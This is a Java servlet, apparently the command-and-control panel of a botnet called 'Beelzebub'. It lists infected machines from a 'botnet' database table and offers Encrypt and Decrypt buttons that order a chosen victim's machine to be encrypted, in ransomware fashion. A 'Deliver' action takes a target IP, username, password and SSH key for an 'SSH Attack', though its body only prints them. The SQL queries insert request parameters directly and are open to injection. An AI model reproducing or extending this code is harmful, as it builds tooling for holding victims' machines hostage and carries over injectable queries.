package beelzebub.servlets;

import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.RequestDispatcher;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.jsp.jstl.sql.Result;
import javax.servlet.jsp.jstl.sql.ResultSupport;

import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.SQLException;
import java.sql.Statement;
import java.sql.Time;
import java.sql.Timestamp;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.LocalTime;
import java.time.Period;
import java.time.format.DateTimeFormatter;
import java.time.temporal.TemporalAccessor;
import java.time.temporal.ValueRange;
import java.util.ArrayList;

/**
 * Servlet implementation class ServletRandomGenerator
 */
@WebServlet("/bots")
public class BotServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;

	// Message to be returned to page
	String message = "";
	String deliveryPopup = "";
	ArrayList<Bot> botList = new ArrayList<Bot>();

	DatabaseManager dbm = new DatabaseManager();
	LocalTime timeCompare = LocalTime.now();
	LocalTime botTime;
	
	int status, count;
	
	
    public BotServlet() {
        super();
    }

	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		
		// Get Writer and page name and action.
		PrintWriter out = response.getWriter();
		String action = request.getParameter("name");
		
		// Create DB Connection.
		Connection dbConn = dbm.connect();
		
		// Refresh the Bot Display
		if(action.equals("refreshBots")) {
			String outputString = refreshBots(dbConn);
			
			out.println(outputString);
		}

		// Encrypt the target machine.
		else if(action.equals("Encrypt")) {
			String IP = request.getParameter("id");
			encrypt(IP);
			refreshBots(dbConn);
		}
		
		// Decrypt the target machine.
		else if(action.equals("Decrypt")) {
			String IP = request.getParameter("id");
			decrypt(IP);
			refreshBots(dbConn);
		}
		
		else if(action.equals("Active")) {
			
			String requestType = request.getParameter("filter");
			String outputString = showActive(dbConn, requestType);
			
			out.println(outputString);
		}
		
		else if(action.equals("Deliver")) {
			
			// Call Delivery class
			String IP = request.getParameter("ip");
			String Uname = request.getParameter("uname");
			String Pass = request.getParameter("pass");
			String Key = request.getParameter("key");
			
			boolean completeDelivery;
			
			
			
			completeDelivery = deliveryBot(IP, Uname, Pass, Key);
			
			if (completeDelivery) {
				String outputString = refreshBots(dbConn);
				out.println(outputString);
			}
		}
		
		// Get the count of active machines.
		int statusCount = botSize();
		
		// Send messages back to page.
	    request.setAttribute("message", message); // This will be available as ${message}
	    request.setAttribute("count", count); //Returns the number of infected bots to the jsp page.
	    request.setAttribute("status", statusCount); //Returns the number of active bots to the jsp page.
	    request.setAttribute("popup", deliveryPopup);
	    
	    request.getRequestDispatcher("/cmd.jsp").forward(request, response);
        
	    // Clear variables to prevent duplications.
	    message = "";
	    deliveryPopup = "";
        botList.clear();
	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
	
		doGet(request, response);
		
	}
	
	/*
	 * refreshBots(Connection dbConn) to connect to the Database and return a string that will be printed on the page.
	 * 
	 * Uses a ResultSet to store the database information.
	 * 
	 */
	
	private String refreshBots(Connection dbConn) {
		
		String returnString = null;
		ResultSet rs = null ;
		Statement statement = null;
		String getBot = "Select * from botnet ORDER BY last_access DESC;";
		String result = null;
	    try {

	    		// Create a DB Statement
	    		statement = dbConn.createStatement();
	        
	    		// Execute the statement
	        if (statement.execute(getBot)) {
		        	
	        	//ResultSet Available
		        rs = statement.getResultSet();
		        returnString += "<hmtl><body>";
		        	
		        	// Traverse the ResultSet rs which holds the results of the DB query
		        	while(rs.next()){
		        		result = rs.getString("IP");
		        		
	        			//Retrieve by column name
	                String username  = rs.getString("username");
	                String IP  = rs.getString("IP");
	                String machine  = rs.getString("machine");
	                Timestamp last_access = (rs.getTimestamp("last_access"));
	                String player  = rs.getString("player");
	                Boolean status  = rs.getBoolean("status");
	                
	                Bot ip = new Bot( username, IP, machine, last_access, player, status);
	                botList.add(ip);
	                
	                //Compare last_access and Current Time to decide to print?!
	                // Logic loop to assign colour to active/inactive bots?
	                	
	                // This message is passed to the servlet request to be displayed on the main index.jsp page
	                message += "<div class=\"col-sm-4\"><div class=\"well botnet\">"
	                		+ "Username: "+ ip.getUsername() + "<br />"
	                		+ "IP Address: "+ ip.getIP() + "<br />"
	                		+ "Machine: "+ ip.getMachine() + "<br />"
	                		+ "Last Active: <br />"+ ip.getTime() + "<br />"
	                		+ "Last Poll: "+ ip.getDifference()+" min" + "<br />";
	                
	                if(ip.getStatus()) {
		                 //If encrypted, display decrypt button
		                		if(status(ip.getIP()).equals("encrypt")) {
		                			message += "<br /><hr><form  method=\"POST\" action=\"/Beelzebub/bots?name=Decrypt&id="+IP+"\" id="+IP+">"
		    	                			+ "<button type=\"SUBMIT\" id="+IP+" class= \"btn btn-warning\" required/> Decrypt</button></form>";
		                		}
		                // If Decrypted, display encrypt button
		                		else if(status(ip.getIP()).equals("decrypt") || status(ip.getIP()).equals("init")) {
		                			message += "<br /><hr><form  method=\"POST\" action=\"/Beelzebub/bots?name=Encrypt&id="+IP+"\" id="+IP+">"
			                				+ "<button type=\"SUBMIT\" id="+IP+" class= \"btn btn-danger\" required/> Encrypt</button></form>";
		                		}
	                }
	                else if(!ip.getStatus()) {
	                		message += "<br /><hr><button type=\"SUBMIT\" class=\"btn btn-info\" disabled> Inactive</button></form>";
	                }
	                		message += "</div></div>";
	                						
	                //Display values
	                returnString += "username: " + username + "<br>";
	                returnString += ", IP: " + IP + "<br>";
	                returnString +=", machine: " + machine + "<br>";
	                returnString +=", last_access: " + last_access + "<br>";
	                returnString +=", player: " + player + "<br>";
	                returnString +=", status: " + status + "<br>";
	                
	             }
		             
	        }else{
		        	System.out.println("Not available");
	        }
	        returnString +="</body></html>";

	    } catch(SQLException ex) {
	        try {
				throw new ServletException(ex);
			} catch (ServletException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
	    } finally {
	    	try {
	    		// Cleanup
				dbConn.close();
				statement.close();
				rs.close();
			} catch (SQLException e) {
				e.printStackTrace();
			}
	    }
	    
	    return returnString;
	}
	
	/*
	 * Show only active bots
	 */
	private String showActive(Connection dbConn, String reqType){
		
		String returnString = null;
		ResultSet rs = null ;
		Statement statement = null;
		String getBot="";
		
		if(reqType!=null) {
			getBot = "Select * from botnet WHERE command="+reqType+" ORDER BY last_access;";
			System.out.println("Request type null");
		}
		else {
			getBot = "Select * from botnet ORDER BY last_access;";
		}
		String result = null;
	    try {

	    		// Create a DB Statement
	    		statement = dbConn.createStatement();
	        
	    		// Execute the statement
	        if (statement.execute(getBot)) {
		        	
	        	//ResultSet Available
		        rs = statement.getResultSet();
		        returnString += "<hmtl><body>";
		        	
		        	// Traverse the ResultSet rs which holds the results of the DB query
		        	while(rs.next()){
		        		result = rs.getString("IP");
		        		
		        		
	        			//Retrieve by column name
	                String username  = rs.getString("username");
	                String IP  = rs.getString("IP");
	                String machine  = rs.getString("machine");
	                Timestamp last_access = (rs.getTimestamp("last_access"));
	                String player  = rs.getString("player");
	                Boolean status  = rs.getBoolean("status");
	                
	                Bot ip = new Bot( username, IP, machine, last_access, player, status);
	                if(ip.getDifference()<3) {
		                botList.add(ip);
		                
		                //Compare last_access and Current Time to decide to print?!
		                // Logic loop to assign colour to active/inactive bots?
		                	
		                // This message is passed to the servlet request to be displayed on the main index.jsp page
		                message += "<div class=\"col-sm-4\"><div class=\"well botnet\">"
		                		+ "Username: "+ ip.getUsername() + "<br />"
		                		+ "IP Address: "+ ip.getIP() + "<br />"
		                		+ "Machine: "+ ip.getMachine() + "<br />"
		                		+ "Last Active: <br />"+ ip.getTime() + "<br />"
		                		+ "Last Poll: "+ ip.getDifference()+" min" + "<br />";
		                
		                if(ip.getStatus()) {
			                 //If encrypted, display decrypt button
			                		if(status(ip.getIP()).equals("encrypt")) {
			                			message += "<br /><hr><form  method=\"POST\" action=\"/Beelzebub/bots?name=Decrypt&id="+IP+"\" id="+IP+">"
			    	                			+ "<button type=\"SUBMIT\" id="+IP+" class= \"btn btn-warning\" required/> Decrypt</button></form>";
			                		}
			                // If Decrypted, display encrypt button
			                		else if(status(ip.getIP()).equals("decrypt") || status(ip.getIP()).equals("init")) {
			                			message += "<br /><hr><form  method=\"POST\" action=\"/Beelzebub/bots?name=Encrypt&id="+IP+"\" id="+IP+">"
				                				+ "<button type=\"SUBMIT\" id="+IP+" class= \"btn btn-danger\" required/> Encrypt</button></form>";
			                		}
		                }
		                else if(!ip.getStatus()) {
		                		message += "<br /><hr><button type=\"SUBMIT\" class=\"btn btn-info\" disabled> Inactive</button></form>";
		                }
		                		message += "</div></div>";
		                						
		                //Display values
		                returnString += "username: " + username + "<br>";
		                returnString += ", IP: " + IP + "<br>";
		                returnString +=", machine: " + machine + "<br>";
		                returnString +=", last_access: " + last_access + "<br>";
		                returnString +=", player: " + player + "<br>";
		                returnString +=", status: " + status + "<br>";
		                
		             }
		        	}       
	        }else{
		        	System.out.println("Not available");
	        }
	        returnString +="</body></html>";

	    } catch(SQLException ex) {
	        try {
				throw new ServletException(ex);
			} catch (ServletException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
	    } finally {
	    	try {
	    		// Cleanup
				dbConn.close();
				statement.close();
				rs.close();
			} catch (SQLException e) {
				e.printStackTrace();
			}
	    }
	    
	    return returnString;
	}
		
	/*
	 * Encryption Function...
	 */
	private void encrypt(String IP) {
		Statement encryptstatement = null;
		System.out.println("********\n"+"Encrypting Bot: " + IP +"\n********");
		
		// Update database with parameters
		Connection dbConn = dbm.connect();
		String dbGetCommand = "UPDATE botnet SET command='encrypt' where ip='"+IP+"';";
		try {
			encryptstatement = dbConn.createStatement();
			encryptstatement.execute(dbGetCommand);
		} catch (SQLException e) {
			e.printStackTrace();
		}
		try {
    		// Cleanup
			dbConn.close();
			encryptstatement.close();
		} catch (SQLException e) {
			e.printStackTrace();
		}
	}
	/*
	 * Decryption Function...
	 */
	private void decrypt(String IP) {
		// Reverse Encryption method
		Statement decryptstatement = null;
		
		System.out.println("********\n"+"Decrypting Bot: " + IP +"\n********");
		
		// Update database with parameters
		Connection dbConn = dbm.connect();
		String dbGetCommand = "UPDATE botnet SET command='decrypt' where ip='"+IP+"';";
		try {
			decryptstatement = dbConn.createStatement();
			decryptstatement.execute(dbGetCommand);
		} catch (SQLException e) {
			e.printStackTrace();
		}
		try {
    		// Cleanup
			dbConn.close();
			decryptstatement.close();
		} catch (SQLException e) {
			e.printStackTrace();
		}
	}
	
	/*
	 * botSize() to return int, the number of bots that are currently active.
	 */
	private int botSize() {
		
		count = botList.size();
		int statusCount = 0; 
		
		for(int i = 0 ; i < count ; i++) {
			
			Bot currentBot = botList.get(i);
			
			if(currentBot.getStatus()) {
				statusCount++;
			}	
		}
		return statusCount;
	}
	
	/*
	 * Function to return the current status of the bot.
	 * Defaulted to "Decrypt".
	 */
	private String status(String IP) {
		// Local variable initalisation.
		Connection dbConn = dbm.connect();
		String dbGetCommand = "SELECT command FROM botnet where ip='"+IP.toString()+"' ;";
		Statement statement = null;
		ResultSet rs = null;
		
		// Default command to "Decrypt".
		String command = "Decrypt";
		
		// Database...
		try {
			statement = dbConn.createStatement();
			statement.execute(dbGetCommand);
			rs = statement.getResultSet();
			while (rs.next()) {
				command = rs.getString("command");
			}
		} catch (SQLException e) {
			e.printStackTrace();
		}
		
		try {
    		// Cleanup
			dbConn.close();
			statement.close();
			rs.close();
		} catch (SQLException e) {
			e.printStackTrace();
		}
		
		return command;
	}
	
	/**
	 * 
	 * Function called when Delivery button in cmd.jsp is pressed.
	 * 
	 * @param IP
	 * 		Input IP Address of target system
	 * @param Uname
	 * 		Input Username to use in SSH Attack
	 * @param Pass
	 * 		Input User Password for SSH Attack
	 * @param Key
	 * 		Input SSH Key for SSH Attack
	 * 
	 */
	private boolean deliveryBot(String IP, String Uname, String Pass, String Key) {
		System.out.println("\nDelivering Beelzebub with the following parameters:\nIP: " +IP+"\nUsername: " + Uname+"\nPassword: "+Pass+"\nSSH Key: "+Key);
		
		return true;
	}

}
